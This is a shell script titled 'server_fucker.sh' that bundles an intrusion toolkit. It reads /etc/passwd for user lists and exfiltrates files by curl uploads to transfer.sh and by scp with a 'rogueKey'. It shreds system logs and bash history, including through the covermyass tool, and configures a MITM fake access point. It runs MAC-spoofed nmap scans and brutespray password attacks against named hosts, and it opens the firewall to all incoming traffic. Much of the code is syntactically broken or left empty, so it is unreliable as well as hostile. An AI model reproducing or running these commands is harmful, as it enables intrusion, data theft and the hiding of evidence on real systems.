#!/bin/sh

#  server_fucker.sh
#  sadfasf
#
#  Created by a-robot on 6/14/22.
#  



	express = "https://86qnr9fs.r.us-east-1.awstrack.me/L0/https:%2F%2Fwww.exp2links2.net%2Fwelcome%3Fsetup_page_token=eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIn0..i7ol6nd7zNRgRZLC0xrpQQ.qohDKmMKM0l7UfeEsXmTUnKLu2wRsywWPyErRSs7egNyGi29EfaYbfTS1xiGFU4QMKhbb5mPosPcxjA0IbIUkI_gQh8kd06w7pfWPTM5km-gHQMn9Lv_UqGX5YNYC-5VIIZZ78v-8R2an8oEu6i1_Xhva2sEvBzC-OkBMeR3eL1aXz6bF_ibFrIaYg1CvtZV.xfnkhDaIcLWJOeBHvl73y-oNPPN_0EuoI8znd2CAnTo%26utm_campaign=your_setup_link%26utm_content=setup_app_button%26utm_medium=email%26utm_source=customer_email%23linux/1/02000000lkl64vp1-hnmgb318-rdsh-drij-dvlq-49q0ekoa9d80-000000/IvETPh3_jgW28TVoC7VGZCvKMXE=273"

hashing = "https://github.com/elithaxxor/shell_hashStuff"
express = "https://86qnr9fs.r.us-east-1.awstrack.me/L0/https:%2F%2Fwww.exp2links2.net%2Fwelcome%3Fsetup_page_token=eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIn0..i7ol6nd7zNRgRZLC0xrpQQ.qohDKmMKM0l7UfeEsXmTUnKLu2wRsywWPyErRSs7egNyGi29EfaYbfTS1xiGFU4QMKhbb5mPosPcxjA0IbIUkI_gQh8kd06w7pfWPTM5km-gHQMn9Lv_UqGX5YNYC-5VIIZZ78v-8R2an8oEu6i1_Xhva2sEvBzC-OkBMeR3eL1aXz6bF_ibFrIaYg1CvtZV.xfnkhDaIcLWJOeBHvl73y-oNPPN_0EuoI8znd2CAnTo%26utm_campaign=your_setup_link%26utm_content=setup_app_button%26utm_medium=email%26utm_source=customer_email%23linux/1/02000000lkl64vp1-hnmgb318-rdsh-drij-dvlq-49q0ekoa9d80-000000/IvETPh3_jgW28TVoC7VGZCvKMXE=273"



SECONDS=0
set timeout=20
## ARGV
set _ip_addr [index $argv 0]
set _home [index $argv 1]
set _pass [index $argv 2]
set _cwd   [index $argv 5]
set _exploitsDir [index $argv 4]
set _savedDir  [index $argv 5]

set HOME_IP  [index $argv 6]
set HOME_USER  [index $argv 7]
set HOME_PASS [index $argv 8]
set HOME_DIR [index $argv 9]
	## DEFAULTS ##
	HOST='192.168.50.1'
	USER='frank'
	PASS='!'
	HOME_DIR='/HOME/'

	DIR='B://MOUNTED_EXPLOITS'
	SAVE_DIR='/SAVED_FILES'
	CWD=$(pwd)

	# read -p "ip" ip
	# read -p "hostname" /hostname

function makeDir () {
	cd '/home/' && mkdir exploitsDir && chmod +r +x ./exploitsDir && mkdir savedData && chmod +r +x ./exploitsDir
}
function _broadcastInfo() {
	_broadcast = $(ifconfig | grep broadcast) > date + broadcast.txt && echo _broadcast
	_inet = $(ifconfig | grep inet)
	_mac = $(ifconfig | grep mac)
	_radio_name = $(iw dev | awk) '$1=="Interface"{print $2}'
	_usb = $(lsusb)
	_mac = $(ifconfig | grep mac)
	_DIRS=$(ls *.txt)
	_devInfo01 = $(powermetrics)
	_devInfo02 = $(Infix -Fxz)
	_sshMSG = "/var/log/syslog"
	_sshLogs =  "/var/log/syslog"
	_passDir = "/etc/passwd"
	_user_list = $(awk -F: '{ print $1}' /etc/passwd)
	_getDB_pass = $(getent passwd | awk -F: '{ print $1}')
	
	
	# _broadcast # function callm
	for i in "$@" ;
	do
		if [[-z $i == "ip" ]] ; then
			_ip_addr = $(_ip_addr)
			echo "[-] IP Is not set, using default vals\n $(_ip_addr)"
		fi
		if [[-z $i == "HOME_USER"]] ; then
			echo "[-] HOME_USER not set, please provide user for the home user\n " read HOME_USER
		fi
		if [[-z $i == "HOME_PASS"]] ; then
			echo "[-] HOME_PASS not set, using default val\n "
		fi
		if [[-z $i == "HOME_DIR"]] ; then
			echo "[-] HOME_PASS not set, defaulting val\n $(HOME_VAL)"
		fi
		
	break
	done


	
	echo "[!] enter home destination for SSH/File Transfers"; read HOME_USER
	echo "[!] enter destination ip"; read HOME_IP
}
function configureSMB {
	# TO ADD USERS TO SAMBA FILE SHARE;:
	smbpasswd -a frank
	smbpasswd -a pi
	# TO VIEW EXISTING SAMBA USERS:
	pdbedit -w -L
	# TO ACCESS THE SMB SAMBA  AS SELF:
	smbclient -U pi //frank-berry/pi
}

function _mangleTTL() {
	echo "[!] Mangling TTL, \n [!] Set NIC Val \n "; read nic_val
	echo "[!] Set TTL Val \n "; read ttl_val
	iptables -t mangle -I POSTROUTING -1 -j $nic_val --ttl -set $ttl_val
	iptables -t mangle -A PREROUTING -i $nic_va -j TTL --ttl-set $ttl_val
	echo "[+] Set TTL Val \n [+]"
}


function startVPN() {
	
}
function _copyImportantLogs() {
	
}

function echoBasic() { echo "****************\n" $(which bash) $$ echo$(ip) $$ echo$(user) $$ echo$(pass) $$ echo$(cwd) $$ echo$(dir) "\n" }
function handleDate() {
	echo "[!] Current Working On: \n" && echoBasic }
	printf "[!] "
	echo "[!] Handling Data [!]"
	date +'FORMAT' ## Time in 12 hr format ###
	date +'%m/%d/%Y'      ### mm/dd/yyyy ###
	date +'%r'## Time in 12 hr format ###
	backup_dir=$(date +'%m/%d/%Y')
	echo " [+] [${date}]\n Backup dir for today: /nas04/backups/${backup_dir}"
	checkLogging
}

function installPackages() {
	sudo apt install gnupg -y && sudo apt install rng-tools -y && sudo mkdir /etc/sysInfo -y && sudo apt install pgp -y
	cd /etc/sysInfo
	sudo sed -i -e 's|#HRNGDEVICE=/dev/hwrng|HRNGDEVICE=/dev/urandom|' /etc/sysInfo
	sudo service rng-tools start
	
	sudo apt-get install john -y && sudo apt install mlocate -y
	sudo apt install wget -y && sudo apt install git-all
	proxychains wget "https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass" && chmod +x covermyass && ./covermyass

	
	## to get rar
	wget https://www.rarlab.com/rar/rarlinux-x64-5.6.0.tar.gz && tar -zxvf rarlinux-x64-5.6.0.tar.gz && sudo cp -v rar unrar /usr/local/bin/
}

function passwordProtectFiles() {
	echo "[!] Protecting File(s) with John"
	echo ".. should we CD somewhere [1 or 2] \n" read cdAns
	
	if [$cdAns == 1] then; cd /etc/sysInfo
	echo ".. should we encrypt one file [1], all files in [CWD] [2] or find a dir to encrypt [3]? [1, 2, 3] \n" read pAns

	if [$pAns == 1]; then
		ls -al && lsHashes && lsTxt
		echo ".. enter the file to protect " read HASHED_FILE
		rar2john $HASHED_FILE
		rar2john $HASHED_FILE > hash.txt
		john --format=zip hash.txt
		echo "${HASHED_FILE} is .rar, proceeding to password protect files!"
		echo "${HASHED_FILE} is .rar, proceeding to password protect files!"
			lsHashes && lsTxt
		
	elif [$pAns == 1]; then
	 [-f "$HASHED_FILE"*.zip]
	then
		echo "${HASHED_FILE} is .zip, starting process!"
		zip2john $HASHED_FILE
		rar2john $HASHED_FILE > hash.txt
		john --format=rar hash.txt
			lsHashes && lsTxt

	else
		echo "${HASHED_FILE} not valid with John The Ripper--> .rar or .zip only!"
	fi
}
}

function lsHashes() { ls *.{.zip} && ls *.{.zip} }
function lsTxt() { ls *.{.txt} }

function encryptFile() {
	
	echo "[ENCYPT and DECRYPTOR] "
	cd /etc/sysInfo
	
	echo "Encrypt 1 == [File] || Encrypt 2 == [all files in CWD]\n Encrypt 3 == [All Files in Specific Dir]" read choice
	
	select option in $choice == 1; then
	
	if [$REPLY == 1];
	then
		ls -al && pwd
		echo "[!] Proceeding with file encription "
		echo "\nplease enter the file name"; read file;
			gpg -c $file
		echo "[+] the file has been encypted $file"
			lsTxt && lsHashes
			ls -a -l  && pwd
	elif [option in $choice == 2;] then
		echo "[!] Proceeding with dir encyrption for [find all dir files]"
			pwd && ls -al
			echo "\nplease enter the file name"; read file;
				gpg-zip --encrypt --output encryptredDir --gpg-args  -r privkey $(pwd)
				ls -a -l && pwd
				lsTxt && lsHashes
			echo "[+] the dir has been encypted $encryptredDir"
		
	elif [option in $choice == 3]
		echo "[!] Proceeding with dir encyrption for [find all dir files]"
		echo "[+] the file has been encypted $dir4encrytpion" read $dir4encrytpion
			gpg-zip --encrypt --output encryptredDir --gpg-args  -r privkey $(pwd)
		echo "[+] the file has been encypted $dir4encrytpion"
			lsTxt && lsHashes
	then
		echo "[!] Proceeding with dir encyrption for [CWD] "

	fi
}


function decrptfile()

{
	echo "Proceeding with [decrypt]"
	cd /etc/sysInfo
	ls -al && pwd
	echo "please enter the file name"
	ls -a -l
	read file2;
	gpg -d $file2
	echo "the file has been decrypted"
}



function makeSSL() {
	echo "[!] Making openSSL Keys \n "
	cd /etc/sysInfo
	
	openssl genrsa -aes256-cbc-out privKey.key 4096; printf("[+].. Generated [AES] Private Key ")
	openssl rsa_in pubKey.key -pubout > publicKey.key; printf("[+].. Generated [AES] Public Key ")
}

function genHashFromFile() {
	findAllTxt
	echo $(ls *.rar)
}

function findAllTxt() {
	
	echo"[!] Find All .txt files  [!]"
	echo ".. where shall we look? " read dir2search
	if [-d $dir2search]; then
	echo"[!] Finding All .txt files $dir2search [!]"
	foundRars = `echo $(ls *.rar) | bc`
	foundRars = `echo $(ls *.rar) | bc`
	echo $(ls *.txt) > MasterTextList.txt && echo $(ls *.rar) > MasterTextList.txt
	
	echo ".. where shall we look? " read dir2search
	if [-f "$MasterTextList.txt"*.rar] then;
	transferBySSH && transfer2FS
	fi
	
}


}
function hashGRUB() { echo  "[!] Current Grub MD5 $(ps -aux | grep imap) \n\n " && echo "[!] MD5 Value $(password --md5 <password-hash>) \n\n" $$ echo "[!] MD5 Value $(/sbin/grub-md5-crypt) \n\n" }



function listDirContents() {
	echo"[!] Sending These Guys back Home [!]"
	DIRS=$(ls *.txt) > MasterTextList.txt
	echo "transfer files?"; read choice
	if [$choice == 1] then;
	transfer
	fi
	
}

function findEmails () {
}
function compareHashWithDataBase() {
	

function transfer2FS(){
	if [ $# -eq 0 ]; then
		echo "No arguments specified.\nUsage:\n transfer <file|directory>\n ... |
		transfer <file_name>">&2;return 1;
	fi;
	
	if tty -s; then file="$1";file_name=$(basename "$file");
	if [ ! -e "$file" ]; then echo "$file: No such file or directory">&2; return 1;
	fi;
	
	if [ -d "$file" ];then
		file_name="$file_name.zip";
		(cd "$file"&&zip -r -q - .) | curl --progress-bar --upload-file "-" "https://transfer.sh/$file_name" | tee /dev/null,;
	else cat "$file"|curl --progress-bar --upload-file "-" "https://transfer.sh/$file_name" | tee /dev/null;
	
	fi;
		else file_name=$1;curl --progress-bar --upload-file "-" "https://transfer.sh/$file_name" | tee /dev/null;
	fi;
}


function transferBySSH () {
	
	echo "[!] Transfering By SSH.. " && echo ".. [1] for cwd [2] for dir search.."
	echo ".. enter file dir" read sshVal
	
	if [-d $dir2search] && [-f $sshVal]; then
		sshDeliminator="/"
		filePath = "${cwd}${sshVal}"
		rsync -avzh /path/to/dir/ user@remote:/path/to/remote/dir/

	else if [-f sshVal ] then;
		scp -i ~/.ssh/rogueKey *.derp HOME_USER@HOME_DIR.org:$HOME_DIR
			echo "put files*.xml" | sftp -p -i ~/.ssh/rogueKey HOME_USER@HOME_DIR.example #u using relative loc
		sftp -b batchfile.txt ~/.ssh/key_name username@hostname.example # using batch in text
			echo "\n\n[+] Transfering By SSH.. Complete! "
	fi
}

function checkLogging() {
	date +'FORMAT'&& date +'%m/%d/%Y' && date +'%r'#
	
	echo $(lsof -i[46][protocol][@hostname|hostaddr][:service|port])
	lsof -Pni
	cp $./systemCTLStatus.txt
	echo $(top)
	
	echo"[!] Checking logging / processes [SYSTEM-CTL AND TOP] \n \n%d$USER@HOST"
	echo $(Systemctl status Rslog.service) > systemCTLisActive.txt && cp $SAVE_DIR = "~//SAVED_FILES"
	echo $(systemctl is-active application.service) > systemCTLStatus.txt && cp $SAVE_DIR = ~/save_dir
	echo $(System.ctl.status)  systemCTLStatus.txt
	
	printf "[!] Resolving Connections on ports \n%d$HOST[!]"
	lsof -i @$_ip_addr && lsof -i @HOSTNAME
	
	printf "[!] Resolving Connections on ports [80, 443, 22, 21] [!]"
	echo $(lsof -i :80) && echo $(lsof -i :443) && echo $(lsof -i :22) && echo $(lsof -i :21)
	printf "[+] RESOLVED! [+]"
}


function sys_update(){
	function handle_UpdateFiles() {
		date +%F
		echo "[!] handling Freshly Created System Files  "
		cp ./apt_log.txt $SAVE_DIR && cp date + ufwLogs.txt $SAVE_DIR
		mountXploits
	}
	
	sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get autoremove && sudo apt-get autoclean
	## To create log file, rsylog needs to be enabled
	sudo service rsyslog status
	##  To create fake AP's,dnsmas and hostapd are required
	sudo apt-get install dnsmasq ## to create multiple dns points
	apt-get install hostapd  ## to get adapter to work as AP
	
	echo "[!] Completed creating Registering required library. Now logging UFW before changes are made. "
	sudo ls /var/log/ufw* > ufwLogs.txt && cp ufwLogs.txt $SAVE_DIR
	sudo tail -f /var/log/ufwLogs.ttxt
	
	date +%F
	echo "Update Log: " > date + apt_log.txt
	handle_UpdateFiles
}

function _mountXploits() {
	function handleFiles() {
		cd /etc/fstab/ &&  ls -al > cifsMountLogs.txt
		cp cifsMountLogs.txt $SAVE_DIR
	}
		mount.cifs //192.168.50.77/b/ //MOUNTED_EXPLOITS -o user=‘HOME_USER’
		mount -t cifs -o vers=1.0,username=t0b1,password=$pw //server.local/shared/ /media/shared
		handleFiles
}

function scanNetwork {
	netstat
	netstat -rn
	nc
	nmap
}


## get passwords from online repos and scp
function getPasswordLists () {
	
}

## add express vpn
function hideMyTracks() {
	proxychains firefox
	proxychains tor
}

function startSSH(){
#	quote USER $USER # protecting a command-line parameter from the shell
#	quote PASS $ADDR
	cd $DIR && SERVER_CWD=$(pwd) && echo $(CWD=$(pwd))
	
	ssh $HOME_USER@$HOME_IP
	spawn ssh "$HOME_USER\@HOME_IP" "reboot"
	send "$_PASSWORD\r";
	
}

function firewallUp() {
	echo "xxxxxxxxxxxxxxx [ TURNING FIREWALL ON] xxxxxxxxxxxxxxx " > fireWallStatus.txt && cp
	sudo ufw logging on
	sudo ufw enable
	Sudo ufw allow ssh
	sudo ufw allow http #80
	sudo ufw allow https ##443
	sudo ufw allow 1920:1935/tcp
	sudo ufw allow 1920:1935/udp
	sudo ufw status > ufwStatus.txt && cp ufwStatus.txt $SAVE_DIR
	iptables -t mangle -I POSTROUTING 1 -j TTL --ttl-set 66
}

function _firewallAllAccess() {
	sudo ufw default deny incoming
	sudo ufw default allow outgoing
}

function _firewallAllAccess () {
	sudo ufw default allow incoming
	sudo ufw default allow outgoing
}



function _sys_update(){
	sudo proxychains &&  apt-get update && sudo apt-get upgrade -y
	## remove unused dependacncies
	sudo proxychains && apt-get autoremove && sudo apt-get autoclean
	## create log file
	echo "Update Log: " > apt_log.txt
	date >> apt_log.txt
}


function StartUp(){
	print("[!] Starting Apt Sessions via Proxy Chains ")
	ssh-keygen -t rsa -b 4096 -C "super_duperHacker@botman.com" -f $HOME/.ssh/rogueKey

	sudo add-apt-repository ppa:ubuntu-toolchain-r/test -y
	sudo apt-get update
	sudo apt-get install g++-7 -y
	sudo apt install proxychains
		socks5 127.0.0.1 1080
		sudo proxychains apt-get update -y
		sudo proxychains apt-get install g++-7 -y
		

	python -m pip install --upgrade pip
	sudo proxychains apt update -y
	sudo proxychains apt upgrade -y
	sudo proxychains apt dist-upgrade -y
	sudo proxychains apt-get install git -y
	sudo proxychains apt install proxychains -y
	
	sudo proxychains apt install chrontab -y
	sudo proxychains apt install expect -y
	sudo proxychains apt install curl -y
	sudo proxychains apt install wget -y
	sudo proxychains apt install tor -y
	
	sudo proxychains apt install inxi -y
	sudo proxychains apt  install ipcalc -y
	sudo proxychains apt install cifs-utils -y
	sudo  proxychains aptinstall mlocate  -y
	sudo  proxychains apt install locate  -y
	sudo updatedb -y
	sudo  proxychains apt-get install -y squashfs-tool -y
	
	sudo  proxychains apt install dnsutils
	sudo  proxychains apt install nginx
	sudo  proxychains apt install netcat  -y
	sudo  proxychains apt install netstat -
	sudo proxychains apt-get install network-manager -y
		systemctl start NetworkManager.service -y  ##starts NMCLI
		systemctl enable NetworkManager.service -y ## sets NMCLI start with system
	sudo updatedb -y
	sudo  proxychains apt install htop -y ## --HTOP is history with a 'reverse' lookup function.. cmd+r
	sudo proxychains apt install dnsutils -y
	sudo proxychains apt install eyewitness -y
	sudo  proxychains apt install dnsmasq -y
	
}

function _sysInfo() {
	
	function handlesysInfo {
		echo "[!] Handling System Logs"
		date
		date + "%FORMAT"
		var=$(date)
		var=`date`
		echo "$var"
		now=$(date)
	}
	mkdir ./systemLogs && cd./systemLogs
		echo $CWD > _userInfo.txt
		echo $HOST > _userInfo.txt
		echo $USER > _userInfo.txt
		echo $DIR >  _userInfo.txt
		
		echo $_broadcast > _networkInfo.txt
		echo $_inet > _networkInfo.txt
		echo $_mac > _networkInfo.txt
		echo $_radio_name > _networkInfo.txt
		echo $_ip_addr > _networkInfo.txt
		
		echo $_devInfo01 > _devInfo.txt
		echo $_devInfo02 > _devInfo.txt
		
		echo $_who > $_who
		passwdDir = "/etc/passwd"
		less $(passwdDir) > _userInfo.txt
		echo "Whos logged in right now $who"
		echo "hash files? " read hashAns
	handlesysInfo
}

function grabNetworkStats() {
	echo "[!] Grabbing Network Stats on \n $_ip "
		mkdir ./networkStats && cd ./networkStats && mac = $()
		sudo arp -a $_ip_addr > arp-oneTime.txt && sudo arp-scan -l > arp-scan.txt
		sudo netstat -rn  > netStat.txt && sudo netstat networkStats.txt && sudo nc > networkStats.txt
		# -PE, -PP, and -PM
		sudo  proxychains nmap -sn -PA --spoof-mac $_mac $_ip_addr #ack ping
		sudo proxychains nmap -sn -PE -R -v --spoof-mac $_mac $_ip_addr
		sudo proxychains nmap -sn -PR --spoof-mac $_mac $_ip_addr
		sudo proxychains nmap -n -sn --send-ip $_ip --spoof-mac $_mac $_ip_addr
		sudo proxychains nmap -sn -PS80 -R -v --spoof-mac $_mac $_ipaddr ## TCP Scan
		sudo proxychains nmap -n -sn --send-ip $_ip_addr #arp scan
		sudo proxychains nmap -n -sn -PR --spoof-mac $_mac --packet-trace --send-eth $_ip_addr
	echo "\n\n[+] Grabbing Network... Great Success!!  \n $_ip \n\n [!].. [Dont Forget to HASH && Encyrpt Results] \n HashFile? " read hashFile
	
	sudo proxychains traceroute > traceResults.txt
	sendTextHome
}



function makeVNC() {
	
	#xrdb $HOME/.Xresources
	#startxfce4 &"
	vncserver -kill :1
	mv ~/.vnc/xstartup ~/.vnc/xstartup.bak
	nano ~/.vnc/xstartup
}

function makeParsec() {
	mkdir //PARSEC/ && cd //PARSEC/
	sudo curl "https://builds.parsecgaming.com/package/parsec-linux.deb"
}



## make fake dns
function fakeAP() {
	#https://cybergibbons.com/security-2/quick-and-easy-fake-wifi-access-point-in-kali/
	
	touch hostapd.conf cat >>
	interface=wlan3
	driver=nl80211
	ssid=Kali-MITM
	channel=1
	touch dnsmasq.conf
	echo 'ADD THIS TO CONFIG FILE'
	interface=wlan3
	dhcp-range=10.0.0.10,10.0.0.250,12h
	dhcp-option=3,10.0.0.1
	dhcp-option=6,10.0.0.1
	server=8.8.8.8
	log-queries
	log-dhcp
	“
	./hostapd.conf
}


function _removeSSHLogs() {
	sudo find _sshMSG -type f -exec shred -n 10 {} \ && sudo find /var/log/syslog -type f -exec shred -n 10 {} \;
	sudo find ~/.ssh/github_rsa.pub -type f -exec shred -n 10 {}
}
function _removeAllLogs() {
	echo "[!] Removing Logs.. \n\t Old Logs\n $(lastlog)"
	sudo find *.log -type f -exec shred -n 10 {} \ && sudo find /var/log -type f -exec shred -n 10 {} # for logs
	cat /dev/null > ~/.bash_history && history -c && exit ## to remove history
	sudo grep -r *.log _sysLogs | sudo rm sysLogs ## just in case #1 doesnt wrok
	rm /root/.bash_history
	dmesg | less && _checkLogs
	sudo covermyass now 
}

function _checkLogs() { cat ./bash_history }

function netcatMontitor () {
	cd /home/exploitsDir
	nc -v -n 8.8.8.8 1-1000 >>
	nc -v -n $_ip_addr 1-1000
	nc -z -v $_ip_addr
	nc -z -v site.com
}
function _removeScriptApt {
		echo ""

}

function _removeImportantLogs() {
	echo ""
}
function _removeWorkDir {
	echo "[!] Removing the work dir"
}

function phpVuln { nmap -sV --script=http-php-version testphp.vulnweb.com }

function bruteSpray() {
	proxychains nmap -sV --script=http-php-version testphp.vulnweb.com
	proxychains nmap 192.168.50.1 -oX /home/frank/nmapout.xml
	proxychains nmap cpanel.dedicatedglass.com/24 -oX /home/frank/nmap.xml
	brutespray --file nmapout.xml --threads 5
	brutespray -file nmapout.xml -t 5 -s ftp
	brutespray --file nmapfuad.xml -U names.txt -P milw0rm-dictionary.txt --threads 5
	brutespray --file nmapfuad.xml -U /home/frank/names.txt -P /home/frank/milw0rm-dictionary.txt --threads 5
}

function harvestOSNIT() { cd /home/frank/the_harvester && python3 theHarvester.py -d dedicatedglass.com -l 500 -b all }
function phoneOsnit() { phonenumbers scanner && phoneinfoga scan -n <number> && phoneinfoga scan -n "+1 (555) 444-1212" }
function socialMedia
function metasploit() { sudo msfconsole }




function runNmapVuln {
	cd /usr/share/nmap/scripts
	nmap --script nmap-vulners/ -sV -sS -Pn -A -v 192.168.50.1/24 --version-intensity=9
	nmap -sV --script=vulscan/vulscan.nse 192.168.50.111
	nmap --script nmap-vulners/ -sV www.securitytrails.com
	nmap --script nmap-vulners/ -sV 11.22.33.44
	nmap --script nmap-vulners/,vulscan/ -sV yourwebsite.com
	nmap -Pn --script vuln 192.168.1.105
}
function enableMonitoringMode () {
}
function mapDeviceDistance () {	sudo iw dev wlx0013eff5483f scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort }

function monitorBT() {

}
function monitorWIFI() {
	sudo iwevent # display wireless events
	sudo iwlist # scan savailable aps or essid
	sudo iwspy # monitors iw nodes and records strenght and quality of signal
	sudo iwgetid # reports current essid
}

function createHotspot90 {
	nmcli device wifi hotspot # create a wifi hotspot
}

function readAvailableESSID90 {
	sudo iwlist [nic name] scan | grep ESSID
	nmcli dev wifi
}
function bypassFirewallSSH() {
	ssh -f -N -D 1080 $_ip_addr
	curl --max-time 3 -x socks5h://127.0.0.1:1080 $_ip_addr
}
function createCustomAP () {
	wpa_supplicant/hostap
	hostapd # to create AP for wifi sharing
	wpa_supplicant # allows scanning and connection to AP
	#### IP2ROUTER --> File sharing / hosting
	i2prouter start
}

while [ "true" ]
do
        VPNCON=$(nmcli con status | grep *MyVPNConnectionName* | cut -f1 -d " ")
        if [[ $VPNCON != "*MyVPNConnectionName*" ]]; then
                echo "Disconnected, trying to reconnect..."
                (sleep 1s && nmcli con up uuid df648abc-d8f7-4ce4-bdd6-3e12cdf0f494)
        else
                echo "Already connected !"
        fi
        sleep 30
done


}
#
function makesslKeys() {
	ssh-keygen -t rsa -b 4096 -C "your_email@example.com"

	# Private key
	openssl genrsa -aes-256-cbc -out macair.key 4096
	# Public key
	openssl rsa -in frank.key -pubout > frankpublic.key
	# verification file
	### making signed encryption
	openssl dgst -sha256 -sign macair.key -out signer verifcation.enc
	# to sign
	openssl base64 -in signer -out verifcation.enc
}

function nmcli() {

}

function _main() {
	startup
	installPackages

	_firewallAllAccess
	_mangleTTL
	_ip_addr
	_broadcastInfo # eeded to pipe vars into commands
	_sysinfo # needed to pipe vars into commands
	_removeSSHLogs
	_removeAlllogs
	_removeScriptApt
	_firewallRevertAccess


	echoBasic
	
}
main


EOF

